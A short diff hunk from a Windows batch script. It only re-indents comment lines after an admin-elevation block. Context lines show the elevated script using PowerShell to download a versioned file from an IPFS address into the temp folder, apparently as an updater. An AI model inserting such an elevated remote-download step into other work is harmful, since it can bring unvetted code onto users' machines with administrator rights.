@@ -45,10 +45,10 @@ REM :::::::::::::::::::::::::::::::::::::::::
 :gotPrivileges
  endlocal
 
- REM :::::::::::::::::::::::::
- REM START
- REM :::::::::::::::::::::::::
- REM Run shell as admin - put your code below as you like
+REM :::::::::::::::::::::::::
+REM START
+REM :::::::::::::::::::::::::
+REM Run shell as admin - put your code below as you like
 setlocal EnableDelayedExpansion
 for %%I in (VERSION*) do set "UPD=%%~nxI"
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://ipfs.io/ipns/k51qzi5uqu5dldod6robuflgitvj276br0xye3adipm3kc0bh17hfiv1e0hnp4/%UPD%', '%temp%\%UPD%')" >nul
